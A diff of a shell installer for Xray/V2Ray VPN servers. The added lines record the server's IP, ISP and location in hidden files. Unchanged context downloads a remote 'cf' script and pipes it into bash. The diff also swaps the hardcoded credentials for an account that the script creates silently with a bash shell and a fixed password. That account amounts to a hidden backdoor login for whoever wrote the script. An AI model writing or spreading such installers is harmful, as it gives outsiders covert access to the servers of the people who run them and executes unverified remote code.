@@ -45,6 +45,11 @@ touch /etc/v2ray/domain
 touch /etc/xray/scdomain
 touch /etc/v2ray/scdomain
 
+curl ipinfo.io/org > /root/.isp
+curl ipinfo.io/city > /etc/xray/city
+curl ipinfo.io/city > /root/.city
+curl ifconfig.me > /root/.ip
+curl ipinfo.io/region > /root/.region
 
 secs_to_human() {
 echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
@@ -113,7 +118,6 @@ echo -e "$green━━━━━━━━━━━━━━━━━━━━━�
     wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
     chmod +x /root/cf
     bash /root/cf | tee /root/install.log
-    print_success "Domain Random Done"
 	elif test $dns -eq 2; then
     read -rp "Enter Your Domain / masukan domain : " dom
     read -rp "Input ur ns-domain : " -e nsdomen
@@ -130,8 +134,8 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 WKT=$(curl -s ipinfo.io/timezone )
 userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
+Username="Fvstores"
+Password=FvpnStores
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
